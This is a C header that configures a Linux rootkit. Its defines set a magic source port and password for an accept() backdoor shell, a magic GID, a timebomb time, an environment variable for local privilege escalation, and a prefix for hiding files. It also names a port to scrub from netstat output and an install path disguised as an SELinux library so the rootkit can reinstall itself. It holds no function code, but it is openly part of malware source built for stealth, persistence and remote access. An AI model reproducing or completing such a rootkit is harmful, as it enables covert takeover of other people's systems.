#ifndef CONFIG
#define CONFIG

/* magic GID */
#define GID 1337
/* magic source port to trigger accept() backdoor */
#define SOURCEPORT 54321
/* time for timebomb() to go off, in seconds since 1970-01-01 */

#define EPOCH_TIME 0000000000

/* magic environment variable for Local Privilege Escalation (LPE) */
#define ENV "3sc4l4t3"

/* magic prefix for hidden files */
#define STRING "h1d3_"

/* name to hide for files */
#define PRELOAD "ld.so.preload.useless" // used for hiding

/* port to remove from netstat output, etc */
#define HIDDENPORT "D431"

/* password for accept() backdoor shell */
#define SHELL_PASS "password"

/* location of rootkit on disk */
#define INSTALL_LOCATION "/lib/selinux.so.3" // used for reinstallation

#endif
